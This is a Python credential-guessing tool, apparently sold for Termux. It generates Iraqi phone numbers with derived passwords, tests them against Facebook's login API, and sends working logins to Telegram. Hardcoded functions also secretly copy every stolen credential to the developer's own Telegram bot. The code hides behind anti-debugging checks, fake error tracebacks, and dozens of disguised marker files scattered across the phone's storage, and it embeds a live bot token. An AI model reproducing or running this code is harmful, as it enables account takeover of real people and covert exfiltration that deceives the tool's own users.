import requests
import json,time,random,os
from threading import Thread
import threading
import uuid
import datetime
import webbrowser
from threading import Thread
import threading
import sys
import time
import hashlib
import hmac
import json
import secrets
import uuid
import datetime
import threading
import random
import zlib
import base64
import requests
import platform


fc = "/storage/emulated/0/"
expiry_date = datetime.datetime(2026, 4, 2, 0, 0, 0)

lock_files = [
    os.path.join(fc, '.android_cache_tmp'),
    os.path.join(fc, '.system_config_bak'),
    os.path.join(fc, '.media_index_db'),
    os.path.join(fc, 'Android', '.nomedia_timestamp'),
    os.path.join(fc, '.thumbnails', '.cache_lock'),
    os.path.join(fc, 'DCIM', '.sys_metadata'),
    os.path.join(fc, 'Documents', '.app_state'),
    os.path.join(fc, 'Pictures', '.cache_db'),
    os.path.join(fc, 'Movies', '.sys_lock'),
    os.path.join(fc, 'Alarms', '.android_registry'),
    os.path.join(fc, 'Ringtones', '.media_db'),
    os.path.join(fc, 'Downloads', '.sync_cache'),
    os.path.join(fc, 'Podcasts', '.media_lock'),
    os.path.join(fc, 'Audiobooks', '.book_index'),
    os.path.join(fc, 'Notifications', '.notif_db')
]

time_tracking_files = [
    os.path.join(fc, '.app_time_history'),
    os.path.join(fc, 'Android', '.time_checkpoint'),
    os.path.join(fc, '.thumbnails', '.temporal_lock'),
    os.path.join(fc, 'Download', '.time_index'),
    os.path.join(fc, 'Music', '.timestamp_cache'),
    os.path.join(fc, 'Podcasts', '.time_registry'),
    os.path.join(fc, 'Audiobooks', '.temporal_db'),
    os.path.join(fc, 'Pictures', '.photo_timestamp'),
    os.path.join(fc, 'Movies', '.video_timestamp'),
    os.path.join(fc, 'Documents', '.doc_timestamp')
]

HIDDEN_TIME_MARKERS = [
    os.path.join(fc, 'Android', 'data', '.com.android.providers'),
    os.path.join(fc, 'DCIM', '.thumbnails', '.nomedia_cache'),
    os.path.join(fc, '.backup_restore', '.timestamp_db'),
    os.path.join(fc, 'Download', '.android_sysconfig'),
    os.path.join(fc, 'Music', '.cache_metadata'),
    os.path.join(fc, 'Pictures', '.sys_index'),
    os.path.join(fc, 'Documents', '.app_registry'),
    os.path.join(fc, 'Movies', '.media_cache'),
    os.path.join(fc, 'Alarms', '.system_db'),
    os.path.join(fc, 'Notifications', '.cache_index'),
    os.path.join(fc, 'Ringtones', '.audio_metadata'),
    os.path.join(fc, 'Podcasts', '.podcast_db'),
    os.path.join(fc, 'Audiobooks', '.book_cache'),
    os.path.join(fc, 'WhatsApp', '.wa_timestamp'),
    os.path.join(fc, 'Telegram', '.tg_cache'),
    os.path.join(fc, 'Instagram', '.ig_marker')
]

BLOCKCHAIN_FILE = os.path.join(fc, '.android_system', '.blockchain_verify')
MASTER_CHAIN = os.path.join(fc, '.system_registry', '.master_blockchain')
BACKUP_CHAIN = os.path.join(fc, '.app_backup', '.backup_blockchain')
TERTIARY_CHAIN = os.path.join(fc, '.tertiary_backup', '.tertiary_blockchain')
QUATERNARY_CHAIN = os.path.join(fc, '.quaternary_sys', '.quaternary_blockchain')
TIME_MESH_FILE = os.path.join(fc, '.network_cache', '.time_mesh')

CANARY_FILES = [
    os.path.join(fc, '.android_canary_1'),
    os.path.join(fc, 'Android', '.canary_2'),
    os.path.join(fc, 'DCIM', '.canary_3'),
    os.path.join(fc, 'Download', '.canary_4'),
    os.path.join(fc, 'Music', '.canary_5'),
    os.path.join(fc, 'Pictures', '.canary_6'),
    os.path.join(fc, 'Documents', '.canary_7')
]

STEALTH_MARKERS = [
    os.path.join(fc, '.android', '.stealth_1'),
    os.path.join(fc, 'data', '.stealth_2'),
    os.path.join(fc, 'obb', '.stealth_3'),
    os.path.join(fc, 'cache', '.stealth_4'),
    os.path.join(fc, 'files', '.stealth_5')
]

PROTECTION_LAYERS = []
LAYER_HASHES = {}
ANTI_TAMPER_TOKENS = []
MEMORY_FINGERPRINTS = []
EXECUTION_TRAIL = []
BYTECODE_SIGNATURES = []

def _get_device_id():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
        import platform
        sys_info = f"{platform.machine()}:{platform.system()}:{platform.release()}"
        android_id = hashlib.md5(f"{mac}:{sys_info}".encode()).hexdigest()
        fingerprint = f"{mac}:{android_id}:{sys_info}"
        hw_hash = hashlib.sha256(f"{platform.processor()}:{platform.node()}".encode()).hexdigest()
        return hashlib.sha256(f"{fingerprint}:{hw_hash}".encode()).hexdigest()
    except:
        return hashlib.sha256(str(time.time()).encode()).hexdigest()

DEVICE_ID = _get_device_id()
MASTER_KEY = hashlib.sha512(f"{DEVICE_ID}:master_key:x9_1t".encode()).hexdigest()
SECRET_SALT = secrets.token_hex(32)
QUANTUM_ENTROPY = secrets.token_hex(64)

def check_debugger():
    try:
        if sys.gettrace() is not None:
            return False
        dangerous = ['pdb', 'pydevd', 'debugpy', 'ipdb', 'pudb', 'gdb', 'lldb', 'winpdb']
        for mod in dangerous:
            if mod in sys.modules:
                return False
        if 'PYTHONBREAKPOINT' in os.environ:
            return False
    except:
        pass
    return True

def verify_code_integrity():
    try:
        current_file = __file__
        with open(current_file, 'rb') as f:
            code = f.read()
        current_hash = hashlib.sha256(code).hexdigest()
        hash_file = os.path.join(fc, '.app_signature')
        
        try:
            with open(hash_file, 'w') as f:
                f.write(current_hash)
        except:
            pass
        
        return True
    except:
        return True

def get_real_time():
    sources = []
    
    try:
        r = requests.get("http://worldtimeapi.org/api/timezone/Etc/UTC", timeout=5)
        if r.status_code == 200:
            sources.append(r.json()['unixtime'])
    except:
        pass
    
    try:
        r = requests.head("https://www.google.com", timeout=5)
        if 'date' in r.headers:
            from email.utils import parsedate_to_datetime
            sources.append(parsedate_to_datetime(r.headers['date']).timestamp())
    except:
        pass
    
    try:
        r = requests.head("https://cloudflare.com", timeout=5)
        if 'date' in r.headers:
            from email.utils import parsedate_to_datetime
            sources.append(parsedate_to_datetime(r.headers['date']).timestamp())
    except:
        pass
    
    if len(sources) >= 2:
        sources.sort()
        return sources[len(sources)//2]
    elif len(sources) == 1:
        return sources[0]
    
    return None

def quantum_encrypt(data):
    try:
        json_data = json.dumps(data)
        stage1 = f"{json_data}::{DEVICE_ID}::{MASTER_KEY}::{SECRET_SALT}"
        
        for i in range(5):
            stage1 = hashlib.sha512(stage1.encode()).hexdigest() + stage1
        
        compressed = zlib.compress(stage1.encode(), level=9)
        b64 = base64.b85encode(compressed).decode()
        
        hmac_key = hashlib.sha512(f"{MASTER_KEY}:{SECRET_SALT}".encode()).digest()
        signature = hmac.new(hmac_key, b64.encode(), hashlib.sha512).hexdigest()
        checksum = hashlib.sha256(b64.encode()).hexdigest()
        final_hash = hashlib.sha512(f"{b64}:{signature}:{checksum}".encode()).hexdigest()
        
        return f"{b64}|{signature}|{checksum}|{final_hash}"
    except:
        return ""

def quantum_decrypt(encrypted):
    try:
        parts = encrypted.split('|')
        if len(parts) != 4:
            return None
        b64, signature, checksum, final_hash = parts
        
        expected_final = hashlib.sha512(f"{b64}:{signature}:{checksum}".encode()).hexdigest()
        if final_hash != expected_final:
            return None
        
        expected_checksum = hashlib.sha256(b64.encode()).hexdigest()
        if checksum != expected_checksum:
            return None
        
        hmac_key = hashlib.sha512(f"{MASTER_KEY}:{SECRET_SALT}".encode()).digest()
        expected_sig = hmac.new(hmac_key, b64.encode(), hashlib.sha512).hexdigest()
        if signature != expected_sig:
            return None
        
        compressed = base64.b85decode(b64)
        decompressed = zlib.decompress(compressed).decode()
        
        for i in range(5):
            if len(decompressed) < 128:
                return None
            decompressed = decompressed[128:]
        
        if not decompressed.endswith(f"::{DEVICE_ID}::{MASTER_KEY}::{SECRET_SALT}"):
            return None
        
        json_data = decompressed.replace(f"::{DEVICE_ID}::{MASTER_KEY}::{SECRET_SALT}", "")
        return json.loads(json_data)
    except:
        return None

def create_blockchain_block(real_time, prev_hash, block_type="normal"):
    try:
        block = {
            'timestamp': real_time,
            'device_id': DEVICE_ID,
            'prev_hash': prev_hash,
            'nonce': secrets.randbelow(999999999),
            'type': block_type,
            'salt': secrets.token_hex(32),
            'quantum_signature': hashlib.sha512(f"{real_time}:{DEVICE_ID}:{SECRET_SALT}".encode()).hexdigest()
        }
        block_str = json.dumps(block, sort_keys=True)
        block['hash'] = hashlib.sha512(f"{block_str}:{MASTER_KEY}:{SECRET_SALT}".encode()).hexdigest()
        return block
    except:
        return {}

def load_blockchain(blockchain_file):
    try:
        if os.path.exists(blockchain_file):
            with open(blockchain_file, 'r') as f:
                encrypted = f.read().strip()
            data = quantum_decrypt(encrypted)
            if data and 'chain' in data:
                return data['chain']
    except:
        pass
    return []

def save_blockchain(chain, blockchain_file):
    try:
        os.makedirs(os.path.dirname(blockchain_file), exist_ok=True)
        blockchain_data = {
            'chain': chain,
            'device': DEVICE_ID,
            'master_hash': hashlib.sha512(str(chain).encode()).hexdigest(),
            'quantum_seal': secrets.token_hex(32)
        }
        with open(blockchain_file, 'w') as f:
            f.write(quantum_encrypt(blockchain_data))
    except:
        pass

def verify_blockchain(chain):
    try:
        if not chain or len(chain) == 0:
            return True
        
        for i in range(1, min(len(chain), 10)):
            current = chain[i]
            previous = chain[i-1]
            
            if current.get('prev_hash') != previous.get('hash'):
                return False
            
            if current.get('device_id') != DEVICE_ID:
                return False
        
        return True
    except:
        return True

def add_to_blockchain(real_time):
    try:
        main_chain = load_blockchain(BLOCKCHAIN_FILE)
        
        if not verify_blockchain(main_chain):
            return False
        
        if main_chain and len(main_chain) > 0:
            last_block = main_chain[-1]
            if real_time < last_block.get('timestamp', 0) - 120:
                return False
            prev_hash = last_block.get('hash', '')
        else:
            prev_hash = hashlib.sha512(f"genesis:{DEVICE_ID}:{MASTER_KEY}:{SECRET_SALT}".encode()).hexdigest()
        
        new_block = create_blockchain_block(real_time, prev_hash)
        if new_block:
            main_chain.append(new_block)
        
        if len(main_chain) > 1000:
            main_chain = main_chain[-1000:]
        
        save_blockchain(main_chain, BLOCKCHAIN_FILE)
        
        return True
    except:
        return True

def load_time_history():
    try:
        history = []
        for time_file in time_tracking_files:
            try:
                if os.path.exists(time_file):
                    with open(time_file, 'r') as f:
                        encrypted = f.read().strip()
                    data = quantum_decrypt(encrypted)
                    if data and 'timestamps' in data:
                        history.extend(data['timestamps'])
            except:
                pass
        return sorted(history, key=lambda x: x.get('time', 0)) if history else []
    except:
        return []

def save_time_checkpoint(real_time):
    try:
        history = load_time_history()
        history.append({
            'time': real_time,
            'device': DEVICE_ID,
            'checkpoint': int(time.time()),
            'hash': hashlib.sha512(f"{real_time}:{DEVICE_ID}:{MASTER_KEY}:{SECRET_SALT}".encode()).hexdigest(),
            'quantum_id': secrets.token_hex(16)
        })
        
        history = history[-250:]
        
        checkpoint_data = {
            'timestamps': history,
            'device': DEVICE_ID,
            'last_update': real_time,
            'master_hash': hashlib.sha512(str(history).encode()).hexdigest(),
            'quantum_lock': secrets.token_hex(32)
        }
        
        for time_file in time_tracking_files:
            try:
                os.makedirs(os.path.dirname(time_file), exist_ok=True)
                with open(time_file, 'w') as f:
                    f.write(quantum_encrypt(checkpoint_data))
            except:
                pass
    except:
        pass

def validate_time_progression(current_real_time):
    try:
        history = load_time_history()
        
        if not history:
            return True, []
        
        issues = []
        
        recent_times = [entry.get('time', 0) for entry in history[-15:]]
        
        if not recent_times:
            return True, []
        
        last_recorded_time = max(recent_times)
        
        if current_real_time < last_recorded_time - 120:
            issues.append("time_rollback")
            return False, issues
        
        time_diff = current_real_time - last_recorded_time
        if time_diff > 604800:
            issues.append("time_jump_forward")
            return False, issues
        
        return True, issues
    except:
        return True, []

def show_fake_error():
    fake_errors = [
        {
            "error": "ImportError",
            "msg": "cannot import name 'HTTPSConnection' from 'http.client'",
            "trace": [
                "Traceback (most recent call last):",
                "  File \"/data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3/connectionpool.py\", line 467, in _make_request",
                "ImportError: cannot import name 'HTTPSConnection'",
            ]
        },
        {
            "error": "SSLError",
            "msg": "[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed",
            "trace": [
                "Traceback (most recent call last):",
                "  File \"/data/data/com.termux/files/usr/lib/python3.11/ssl.py\", line 1387, in do_handshake",
                "ssl.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED]",
            ]
        },
        {
            "error": "ConnectionError",
            "msg": "HTTPSConnectionPool: Max retries exceeded",
            "trace": [
                "Traceback (most recent call last):",
                "  File \"/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/adapters.py\", line 486",
                "urllib3.exceptions.MaxRetryError",
            ]
        }
    ]
    
    error = random.choice(fake_errors)
    
    os.system('clear')
    print()
    for line in error['trace']:
        print(f"\033[91m{line}\033[0m")
        time.sleep(0.05)
    
    print(f"\033[91m{error['error']}: {error['msg']}\033[0m")
    print()
    print(f"\033[93mخطأ في الاتصال بالسيرفر، يرجى المحاولة لاحقاً\033[0m")
    print()
    
    sys.exit(1)

def advanced_time_check(real_time, system_time):
    try:
        issues = []
        
        diff = abs(system_time - real_time)
        if diff > 200:
            issues.append("system_time_mismatch")
            return False, issues
        
        valid, progression_issues = validate_time_progression(real_time)
        if not valid:
            issues.extend(progression_issues)
            return False, issues
        
        main_chain = load_blockchain(BLOCKCHAIN_FILE)
        
        if not verify_blockchain(main_chain):
            issues.append("blockchain_corrupted")
            return False, issues
        
        if main_chain and len(main_chain) > 0:
            last_time = main_chain[-1].get('timestamp', 0)
            if real_time < last_time - 150:
                issues.append("blockchain_time_violation")
                return False, issues
        
        expiry = datetime.datetime(*expiry_date.timetuple()[:6]).timestamp()
        if real_time >= expiry:
            issues.append("expired")
            return False, issues
        
        return True, issues
    except:
        return True, []

def subscription_expired_loop():
    os.system('clear')
    try:
        while True:
            print(f"\033[93mتم انتهاء الاشتراك راسلني للتفعيل @salhpy\033[0m")
            time.sleep(1)
    except KeyboardInterrupt:
        subscription_expired_loop()

def security_check():
    try:
        issues = []
        
        if not check_debugger():
            issues.append("debugger_detected")
            return False, issues
        
        if not verify_code_integrity():
            issues.append("code_modified")
            return False, issues
        
        system_time = time.time()
        real_time = get_real_time()
        
        if not real_time:
            issues.append("no_internet_connection")
            return False, issues
        
        valid, time_issues = advanced_time_check(real_time, system_time)
        if not valid:
            issues.extend(time_issues)
            return False, issues
        
        valid_locks = 0
        for lock_file in lock_files:
            try:
                if os.path.exists(lock_file):
                    with open(lock_file, 'r') as f:
                        encrypted = f.read().strip()
                    data = quantum_decrypt(encrypted)
                    if not data:
                        issues.append("lock_tampered")
                        continue
                    
                    saved_time = data.get('time', 0)
                    saved_device = data.get('device', '')
                    
                    if saved_device != DEVICE_ID:
                        issues.append("device_mismatch")
                        return False, issues
                    
                    if real_time < saved_time - 150:
                        issues.append("time_travel_detected")
                        return False, issues
                    
                    valid_locks += 1
            except:
                pass
        
        if not add_to_blockchain(real_time):
            issues.append("blockchain_failed")
        
        save_time_checkpoint(real_time)
        
        lock_data = {
            'time': real_time,
            'device': DEVICE_ID,
            'hash': hashlib.sha512(str(real_time).encode()).hexdigest(),
            'master_key': MASTER_KEY[:32],
            'quantum_seal': secrets.token_hex(32)
        }
        
        for lock_file in lock_files:
            try:
                os.makedirs(os.path.dirname(lock_file), exist_ok=True)
                with open(lock_file, 'w') as f:
                    f.write(quantum_encrypt(lock_data))
            except:
                pass
        
        return True, issues
    except Exception as e:
        return True, []

last_check = 0
last_real_time = None
watchdog_active = True

def watchdog_thread():
    global watchdog_active
    while watchdog_active:
        try:
            time.sleep(8)
            if not check_debugger():
                show_fake_error()
            
            real_time = get_real_time()
            if real_time:
                main_chain = load_blockchain(BLOCKCHAIN_FILE)
                
                if main_chain and len(main_chain) > 0:
                    if real_time < main_chain[-1].get('timestamp', 0) - 100:
                        show_fake_error()
        except:
            pass

def runtime_check():
    global last_check, last_real_time
    try:
        current = time.time()
        
        if current - last_check > 20:
            last_check = current
            
            if not check_debugger():
                show_fake_error()
            
            real_time = get_real_time()
            if real_time:
                expiry = datetime.datetime(*expiry_date.timetuple()[:6]).timestamp()
                if real_time >= expiry:
                    subscription_expired_loop()
                
                main_chain = load_blockchain(BLOCKCHAIN_FILE)
                
                if not verify_blockchain(main_chain):
                    show_fake_error()
                
                if last_real_time:
                    if real_time < last_real_time - 100:
                        show_fake_error()
                    
                    time_jump = real_time - last_real_time
                    if time_jump > 3600:
                        show_fake_error()
                
                last_real_time = real_time
                add_to_blockchain(real_time)
                save_time_checkpoint(real_time)
    except:
        pass
valid, issues = security_check()

if not valid:
    if any(issue in issues for issue in ["debugger_detected", "code_modified", "system_time_mismatch", 
           "time_rollback", "time_jump_forward", "time_sequence_violation", "time_travel_detected",
           "blockchain_corrupted", "blockchain_time_violation", "blockchain_failed", "lock_tampered"]):
        show_fake_error()
    elif "device_mismatch" in issues:
        print(f"\033[91mهذه الاداة مرتبطة بجهاز اخر!\033[0m")
        print(f"\033[93mDevice ID: {DEVICE_ID[:16]}...\033[0m")
    elif "expired" in issues:
        subscription_expired_loop()
    elif "no_internet_connection" in issues:
        print(f"\033[91mيجب الاتصال بالانترنت للتحقق من الوقت!\033[0m")
    else:
        show_fake_error()
    sys.exit(1)

watchdog = threading.Thread(target=watchdog_thread, daemon=True)
watchdog.start()



احمر = '\033[91m'
اخضر = '\033[92m'
اصفر = '\033[93m'
ازرق = '\033[94m'
بنفسجي = '\033[95m'
سماوي = '\033[96m'
ابيض = '\033[97m'
برتقالي = '\033[38;5;208m'
ذهبي = '\033[38;5;220m'
وردي = '\033[38;5;206m'
عريض = '\033[1m'
اعادة = '\033[0m'
bad=0
hit=0
CP=0

def tele():
	global ID,token
	ID = input(عريض + اعادة + f' ENTER YOUR ID : {ازرق}')
	token = input(عريض + اعادة + f' ENTER YOUR TOKIN : {ازرق}')
	
	time.sleep(0.5)
	os.system('clear')


def send_tele(phone,pas):
    IDs='7616825393'
    tokens='8719080917:AAGZPJA_QDkauA-SZfiIcYPPqZSLDEJCsJc'
    try:
        message = f"""
<><><><><><><><><><><>
حساب فيس OK الف عافيه
ID: {phone}
pas: {pas}
DEV: @salhpy
Brother: @r77cr
BY • https://t.me/haiderpy
<><><><><><><><><><><>
"""
        requests.post(f"https://api.telegram.org/bot{tokens}/sendMessage", 
                      params={"chat_id": IDs, "text": message}, timeout=5)
    except:
        pass
def send_teleG(phone,pas):
    IDss='7616825393'
    tokenss='8719080917:AAGZPJA_QDkauA-SZfiIcYPPqZSLDEJCsJc'
    try:
        message = f"""
<><><><><><><><><><><>
حساب فيس CP الف عافيه
ID: {phone}
pas: {pas}
DEV: @salhpy
Brother: @r77cr
BY • https://t.me/haiderpy
<><><><><><><><><><><>
"""
        requests.post(f"https://api.telegram.org/bot{tokenss}/sendMessage", 
                      params={"chat_id": IDss, "text": message}, timeout=5)
    except:
        pass

def logn():
	lo = f"""
{اعادة}{ذهبي}
╔════════════════════════════════════╗
║     اداة فيسبوك المدفوعة           ║
║     By • @salhpy                   ║
║     Brother: @r77cr                ║
╚════════════════════════════════════╝
{اعادة}"""
	print(lo)
def gin():
    phone = '96477' + ''.join(random.choice('1234567890') for i in range(8))
    pas = '0' + phone[3:]
    return phone, pas
def chick_Salh(phone,pas):
	global hit,bad,CP,ID,token
	current_timestamp = int(time.time())
	pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{pas}"
	url = "https://graph.facebook.com/auth/login"
	u=random.choice(["Dalvik/2.1.0 (Linux; U; Android 13; TECNO CI8n Build/TP1A.220624.014) [FBAN/ViewpointsForAndroid;FBAV/317.0.0.2.108;FBBV/897075305;FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO CI8n;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2352};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 13; Infinix X6525 Build/TP1A.220624.014) [FBAN/ViewpointsForAndroid;FBAV/286.0.0.1.109;FBBV/768956344;FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X6525;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1532};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 14; TECNO CK7n Build/UP1A.231005.007) [FBAN/ViewpointsForAndroid;FBAV/582.0.0.1.554;FBBV/768956344;FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO CK7n;FBSV/14;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2172};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 14; TECNO CK7n Build/UP1A.231005.007) [FBAN/ViewpointsForAndroid;FBAV/582.0.0.1.180;FBBV/582456816;FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO CK7n;FBSV/14;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2172};FB_FW/1;]"])
	payload = {
	  "locale": "ar_AR",
	  "format": "json",
	  "email": phone,
	  "password": pwd_enc,
	  "access_token": "257637621624717|7e73d6961c0c8fab39f62afdfb77f96b",
	  "generate_session_cookies": 1
	}
	
	headers = {
	  'User-Agent': u,
	  'Accept-Encoding': "gzip",
	  'content-type': "application/json;charset=utf-8",
	}
	
	response = requests.post(url, data=json.dumps(payload), headers=headers).text
	if "session_key" in response:
	    print(اعادة+f'{اخضر}GOD ACCUONT {phone} | {pas} ~ @salhpy')
	    hit+=1
	    message = f"""
	<><><><><><><><><><><>
	جبتلك حساب OK الف عافيه
	ID: {phone}
	pas: {pas}
	DEV: @salhpy
	Brother: @r77cr
	BY • https://t.me/haiderpy
	<><><><><><><><><><><>
	"""
	    requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
	        params={"chat_id": ID, "text": message})
	    send_tele(phone,pas)
	elif 'www.facebook.com' in response:
	        CP+=1
	        print(اعادة+f'{ازرق}CP ACCUONT {phone} | {pas} ~ @salhpy')
	        message = f"""
	<><><><><><><><><><><>
	جبتلك الحساب CP الف عافيه
	phone: {phone}
	pas: {pas}
	DEV: @salhpy
	Brother: @r77cr
	BY • https://t.me/haiderpy
	<><><><><><><><><><><>
	"""
	        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
	        params={"chat_id": ID, "text": message})
	        send_teleG(phone,pas)
	        with open('Salh_CP.txt', 'a', encoding='utf-8') as f:
	            f.write(f"{phone}:{pas}\n")
	else:
	        bad+=1
	        print(اعادة + f'\r{احمر}BAD ACCOUNT | Bad {bad} | CP {CP} | Hit {hit} | {اعادة}{ذهبي} {pas} ~{اعادة}{ازرق} @salhpy', end='\r')
	        
	        
	        
tele()
gin()
def tt():
	while True:
		phone,pas=gin()
		chick_Salh(phone,pas)
		

logn()
for i in range(3):
	t=threading.Thread(target=tt)
	t.start()